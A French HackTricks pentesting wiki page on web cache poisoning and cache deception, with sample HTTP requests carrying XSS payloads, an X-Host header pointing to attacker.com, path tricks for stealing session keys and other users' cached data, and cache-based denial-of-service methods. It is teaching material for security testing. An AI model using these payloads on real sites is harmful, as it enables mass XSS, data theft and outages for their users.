# Empoisonnement de cache et Tromperie de cache

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser facilement des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## La diff√©rence

> **Quelle est la diff√©rence entre l'empoisonnement de cache web et la tromperie de cache web ?**
>
> * Dans l'**empoisonnement de cache web**, l'attaquant fait en sorte que l'application stocke un contenu malveillant dans le cache, et ce contenu est servi √† partir du cache √† d'autres utilisateurs de l'application.
> * Dans la **tromperie de cache web**, l'attaquant fait en sorte que l'application stocke un contenu sensible appartenant √† un autre utilisateur dans le cache, puis l'attaquant r√©cup√®re ce contenu √† partir du cache.

## Empoisonnement de cache

L'empoisonnement de cache vise √† manipuler le cache c√¥t√© client pour forcer les clients √† charger des ressources inattendues, partielles ou sous le contr√¥le d'un attaquant. L'ampleur de l'impact d√©pend de la popularit√© de la page affect√©e, car la r√©ponse contamin√©e est servie exclusivement aux utilisateurs visitant la page pendant la p√©riode de contamination du cache.

L'ex√©cution d'une attaque d'empoisonnement de cache implique plusieurs √©tapes :

1. **Identification des entr√©es non cl√©s** : Il s'agit de param√®tres qui, bien qu'ils ne soient pas n√©cessaires pour qu'une requ√™te soit mise en cache, peuvent modifier la r√©ponse renvoy√©e par le serveur. L'identification de ces entr√©es est cruciale car elles peuvent √™tre exploit√©es pour manipuler le cache.
2. **Exploitation des entr√©es non cl√©s** : Apr√®s avoir identifi√© les entr√©es non cl√©s, l'√©tape suivante consiste √† comprendre comment exploiter ces param√®tres pour modifier la r√©ponse du serveur de mani√®re √† b√©n√©ficier √† l'attaquant.
3. **S'assurer que la r√©ponse empoisonn√©e est mise en cache** : La derni√®re √©tape consiste √† s'assurer que la r√©ponse manipul√©e est stock√©e dans le cache. De cette mani√®re, tout utilisateur acc√©dant √† la page affect√©e pendant que le cache est empoisonn√© recevra la r√©ponse contamin√©e.

### D√©couverte : V√©rifier les en-t√™tes HTTP

G√©n√©ralement, lorsqu'une r√©ponse a √©t√© **stock√©e dans le cache**, il y aura un **en-t√™te l'indiquant**, vous pouvez v√©rifier quels en-t√™tes vous devriez surveiller dans ce post : [**En-t√™tes de cache HTTP**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### D√©couverte : Mise en cache du code 400

Si vous pensez que la r√©ponse est mise en cache, vous pourriez essayer d'**envoyer des requ√™tes avec un mauvais en-t√™te**, qui devrait √™tre r√©pondu par un **code d'√©tat 400**. Ensuite, essayez d'acc√©der √† la requ√™te normalement et si la **r√©ponse est un code d'√©tat 400**, vous savez qu'elle est vuln√©rable (et vous pourriez m√™me effectuer un d√©ni de service).\
Un en-t√™te mal configur√© pourrait √™tre simplement `\:` en tant qu'en-t√™te.\
_Notez que parfois ce type de codes d'√©tat n'est pas mis en cache, donc ce test sera inutile._

### D√©couverte : Identifier et √©valuer les entr√©es non cl√©s

Vous pourriez utiliser [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) pour **brute-force des param√®tres et des en-t√™tes** qui pourraient **modifier la r√©ponse de la page**. Par exemple, une page pourrait utiliser l'en-t√™te `X-Forwarded-For` pour indiquer au client de charger le script √† partir de l√† :
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Obtenir une r√©ponse nuisible du serveur back-end

Avec le param√®tre/l'en-t√™te identifi√©, v√©rifiez comment il est **sanitis√©** et **o√π** il est **refl√©t√©** ou affecte la r√©ponse de l'en-t√™te. Pouvez-vous l'exploiter de toute fa√ßon (effectuer un XSS ou charger un code JS contr√¥l√© par vous ? effectuer un DoS ?...)

### Obtenir la r√©ponse mise en cache

Une fois que vous avez **identifi√©** la **page** qui peut √™tre exploit√©e, quel **param√®tre**/**en-t√™te** utiliser et **comment** l'**exploiter**, vous devez mettre en cache la page. Selon la ressource que vous essayez de mettre en cache, cela pourrait prendre du temps, vous pourriez devoir essayer pendant plusieurs secondes.\
L'en-t√™te **`X-Cache`** dans la r√©ponse pourrait √™tre tr√®s utile car il peut avoir la valeur **`miss`** lorsque la requ√™te n'√©tait pas mise en cache et la valeur **`hit`** lorsqu'elle est mise en cache.\
L'en-t√™te **`Cache-Control`** est √©galement int√©ressant pour savoir si une ressource est mise en cache et quand la prochaine fois la ressource sera mise en cache √† nouveau : `Cache-Control: public, max-age=1800`\
Un autre en-t√™te int√©ressant est **`Vary`**. Cet en-t√™te est souvent utilis√© pour **indiquer des en-t√™tes suppl√©mentaires** qui sont trait√©s comme **partie de la cl√© de cache** m√™me s'ils ne sont normalement pas cl√©s. Par cons√©quent, si l'utilisateur conna√Æt l'`User-Agent` de la victime qu'il cible, il peut empoisonner le cache pour les utilisateurs utilisant ce `User-Agent` sp√©cifique.\
Un autre en-t√™te li√© au cache est **`Age`**. Il d√©finit le temps en secondes pendant lequel l'objet a √©t√© dans le cache proxy.

Lors de la mise en cache d'une requ√™te, soyez **prudent avec les en-t√™tes que vous utilisez** car certains d'entre eux pourraient √™tre **utilis√©s de mani√®re inattendue** comme **cl√©s** et la **victime devra utiliser le m√™me en-t√™te**. Testez toujours un empoisonnement de cache avec **diff√©rents navigateurs** pour v√©rifier s'il fonctionne.

## Exemples d'exploitation

### Exemple le plus simple

Un en-t√™te comme `X-Forwarded-For` est refl√©t√© dans la r√©ponse non sanitis√©e.\
Vous pouvez envoyer une charge utile XSS de base et empoisonner le cache afin que tout le monde qui acc√®de √† la page soit victime d'un XSS :
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
### Utilisation de l'empoisonnement du cache web pour exploiter les vuln√©rabilit√©s de gestion des cookies

Les cookies pourraient √©galement √™tre refl√©t√©s dans la r√©ponse d'une page. Si vous pouvez en abuser pour provoquer une XSS par exemple, vous pourriez √™tre en mesure d'exploiter la XSS dans plusieurs clients qui chargent la r√©ponse du cache malveillant.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Notez que si le cookie vuln√©rable est tr√®s utilis√© par les utilisateurs, les requ√™tes r√©guli√®res nettoieront le cache.

### Empoisonnement du cache avec travers√©e de chemin pour voler la cl√© API <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Cette explication**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) explique comment il √©tait possible de voler une cl√© API OpenAI avec une URL comme `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` car tout ce qui correspond √† `/share/*` sera mis en cache sans que Cloudflare ne normalise l'URL, ce qui a √©t√© fait lorsque la requ√™te est arriv√©e au serveur web.

### Utilisation de plusieurs en-t√™tes pour exploiter les vuln√©rabilit√©s d'empoisonnement du cache web <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Parfois, vous devrez **exploiter plusieurs entr√©es non cl√©s** pour pouvoir abuser d'un cache. Par exemple, vous pouvez trouver une **redirection ouverte** si vous d√©finissez `X-Forwarded-Host` sur un domaine que vous contr√¥lez et `X-Forwarded-Scheme` sur `http`. **Si** le **serveur** redirige toutes les **requ√™tes HTTP** vers HTTPS et utilise l'en-t√™te `X-Forwarded-Scheme` comme nom de domaine pour la redirection. Vous pouvez contr√¥ler vers o√π la page est dirig√©e par la redirection.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Exploiter avec l'en-t√™te `Vary` limit√©

Si vous d√©couvrez que l'en-t√™te **`X-Host`** est utilis√© comme **nom de domaine pour charger une ressource JS** mais que l'en-t√™te **`Vary`** dans la r√©ponse indique **`User-Agent`**. Ensuite, vous devez trouver un moyen d'exfiltrer l'User-Agent de la victime et de contaminer le cache en utilisant cet User-Agent:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Exploiter la falsification du cache HTTP en abusant du Smuggling de Requ√™tes HTTP

Apprenez ici comment effectuer des attaques de falsification du cache en abusant du Smuggling de Requ√™tes HTTP.

### Test automatis√© pour la falsification du cache Web

Le [Scanner de Vuln√©rabilit√© du Cache Web](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) peut √™tre utilis√© pour tester automatiquement la falsification du cache web. Il prend en charge de nombreuses techniques diff√©rentes et est hautement personnalisable.

Exemple d'utilisation : `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** facilement gr√¢ce aux outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Exemples Vuln√©rables

### Serveur de Trafic Apache ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS a transmis le fragment √† l'int√©rieur de l'URL sans le supprimer et a g√©n√©r√© la cl√© de cache en utilisant uniquement l'h√¥te, le chemin et la requ√™te (en ignorant le fragment). Ainsi, la requ√™te `/#/../?r=javascript:alert(1)` a √©t√© envoy√©e au backend en tant que `/#/../?r=javascript:alert(1)` et la cl√© de cache n'avait pas le payload √† l'int√©rieur, seulement l'h√¥te, le chemin et la requ√™te.

### CP-DoS de GitHub

L'envoi d'une mauvaise valeur dans l'en-t√™te de type de contenu a d√©clench√© une r√©ponse mise en cache 405. La cl√© de cache contenait le cookie, il √©tait donc possible d'attaquer uniquement les utilisateurs non authentifi√©s.

### GitLab + CP-DoS GCP

GitLab utilise des compartiments GCP pour stocker du contenu statique. Les **compartiments GCP** prennent en charge l'en-t√™te `x-http-method-override`. Il √©tait donc possible d'envoyer l'en-t√™te `x-http-method-override: HEAD` et de falsifier le cache pour renvoyer un corps de r√©ponse vide. Il pouvait √©galement prendre en charge la m√©thode `PURGE`.

### Middleware Rack (Ruby on Rails)

Dans les applications Ruby on Rails, le middleware Rack est souvent utilis√©. Le code Rack a pour but de prendre la valeur de l'en-t√™te **`x-forwarded-scheme`** et de la d√©finir comme sch√©ma de la requ√™te. Lorsque l'en-t√™te `x-forwarded-scheme: http` est envoy√©, une redirection 301 vers le m√™me emplacement se produit, entra√Ænant potentiellement un d√©ni de service (DoS) sur cette ressource. De plus, l'application pourrait reconna√Ætre l'en-t√™te `X-forwarded-host` et rediriger les utilisateurs vers l'h√¥te sp√©cifi√©. Ce comportement peut entra√Æner le chargement de fichiers JavaScript √† partir du serveur d'un attaquant, posant un risque de s√©curit√©.

### 403 et Compartiments de Stockage

Cloudflare mettait pr√©c√©demment en cache les r√©ponses 403. Tenter d'acc√©der √† des objets S3 ou Azure Storage Blobs avec des en-t√™tes d'autorisation incorrects entra√Ænerait une r√©ponse 403 mise en cache. Bien que Cloudflare ait cess√© de mettre en cache les r√©ponses 403, ce comportement pourrait encore √™tre pr√©sent dans d'autres services proxy.

### Injection de Param√®tres Cl√©s

Les caches incluent souvent des param√®tres GET sp√©cifiques dans la cl√© de cache. Par exemple, Varnish de Fastly mettait en cache le param√®tre `size` dans les requ√™tes. Cependant, si une version encod√©e en URL du param√®tre (par exemple, `siz%65`) √©tait √©galement envoy√©e avec une valeur erron√©e, la cl√© de cache serait construite en utilisant le param√®tre `size` correct. Cependant, le backend traiterait la valeur dans le param√®tre encod√© en URL. L'encodage en URL du deuxi√®me param√®tre `size` entra√Ænait son omission par le cache mais son utilisation par le backend. L'attribution d'une valeur de 0 √† ce param√®tre entra√Ænait une erreur 400 Bad Request mise en cache.

### R√®gles de l'Agent Utilisateur

Certains d√©veloppeurs bloquent les requ√™tes avec des agents utilisateurs correspondant √† ceux des outils √† fort trafic comme FFUF ou Nuclei pour g√©rer la charge du serveur. Ironiquement, cette approche peut introduire des vuln√©rabilit√©s telles que la falsification du cache et le DoS.

### Champs d'En-t√™te Ill√©gaux

Le [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) sp√©cifie les caract√®res acceptables dans les noms d'en-t√™te. Les en-t√™tes contenant des caract√®res en dehors de la plage sp√©cifi√©e **tchar** devraient id√©alement d√©clencher une r√©ponse 400 Bad Request. En pratique, les serveurs ne respectent pas toujours cette norme. Un exemple notable est Akamai, qui transmet les en-t√™tes avec des caract√®res invalides et met en cache toute erreur 400, tant que l'en-t√™te `cache-control` n'est pas pr√©sent. Un sch√©ma exploitable a √©t√© identifi√© o√π l'envoi d'un en-t√™te avec un caract√®re ill√©gal, tel que `\`, entra√Ænerait une erreur 400 Bad Request mise en cache.

### Trouver de nouveaux en-t√™tes

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Falsification du Cache

L'objectif de la falsification du cache est de faire en sorte que les clients **chargent des ressources qui vont √™tre enregistr√©es par le cache avec leurs informations sensibles**.

Tout d'abord, notez que les **extensions** telles que `.css`, `.js`, `.png`, etc. sont g√©n√©ralement **configur√©es** pour √™tre **enregistr√©es** dans le **cache**. Par cons√©quent, si vous acc√©dez √† `www.example.com/profile.php/nonexistent.js`, le cache stockera probablement la r√©ponse car il voit l'extension `.js`. Cependant, si l'**application** rejoue avec le **contenu sensible** de l'utilisateur stock√© dans _www.example.com/profile.php_, vous pouvez **voler** ces contenus √† d'autres utilisateurs.

Autres choses √† tester :

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Utilisez des extensions moins connues telles que_ `.avif`

Un autre exemple tr√®s clair peut √™tre trouv√© dans ce compte rendu : [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Dans l'exemple, il est expliqu√© que si vous chargez une page inexistante comme _http://www.example.com/home.php/non-existent.css_, le contenu de _http://www.example.com/home.php_ (**avec les informations sensibles de l'utilisateur**) va √™tre renvoy√© et le serveur de cache va enregistrer le r√©sultat.\
Ensuite, l'**attaquant** peut acc√©der √† _http://www.example.com/home.php/non-existent.css_ dans son propre navigateur et observer les **informations confidentielles** des utilisateurs qui ont acc√©d√© avant.

Notez que le **proxy de cache** doit √™tre **configur√©** pour **mettre en cache** les fichiers **en fonction** de l'**extension** du fichier (_.css_) et non en fonction du type de contenu. Dans l'exemple _http://www.example.com/home.php/non-existent.css_ aura un type de contenu `text/html` au lieu d'un type MIME `text/css` (qui est attendu pour un fichier _.css_).

Apprenez ici comment effectuer des attaques de falsification du cache en abusant du Smuggling de Requ√™tes HTTP.

## Outils Automatiques

* [**toxicache**](https://github.com/xhzeem/toxicache) : Scanner Golang pour trouver des vuln√©rabilit√©s de falsification du cache web dans une liste d'URLs et tester plusieurs techniques d'injection.

## R√©f√©rences

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour construire et **automatiser des workflows** facilement gr√¢ce aux outils communautaires les plus avanc√©s au monde.\
Acc√©dez d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>
<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
